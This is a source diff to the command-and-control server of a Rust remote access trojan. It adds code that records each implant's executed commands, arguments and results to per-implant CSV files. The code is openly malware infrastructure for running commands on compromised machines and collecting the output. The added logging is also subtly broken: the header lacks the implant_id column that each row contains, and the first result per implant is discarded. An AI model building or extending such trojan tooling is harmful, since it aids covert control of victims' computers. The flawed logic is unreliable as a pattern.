@@ -4,6 +4,9 @@ use remote_access_trojan::rat::record_command_result_server::{RecordCommandResul
 use remote_access_trojan::rat::{Beacon, Empty, CommandRequest, CommandResponse};
 use std::collections::HashMap;
 use std::fmt;
+use std::fs::{self, OpenOptions};
+use std::io::Write;
+use std::path::Path;
 use tonic::{Request, Response, Status};
 use tonic::transport::Server;
 
@@ -67,6 +70,17 @@ impl RecordCommandResult for MyRecordCommandResult {
         let command = pretty_print_command(RatCommand::from_i32(request.command).unwrap());
         let arguments = request.arguments;
         let result = request.result;
+        let filename = format!("./{implant_id}.csv");
+        if Path::new(&filename).exists() {
+            let mut file = OpenOptions::new()
+                                    .append(true)
+                                    .open(filename)
+                                    .unwrap();
+            let data = format!("{implant_id},{timestamp},{command},{arguments},{result}");
+            writeln!(file, "{data}").unwrap();
+        } else {
+            fs::write(filename, format!("timestamp,command,arguments,result\n")).unwrap();
+        }
         println!("{implant_id},{timestamp},{command},{arguments},{result}");
         Ok(Response::new(
             Empty {}
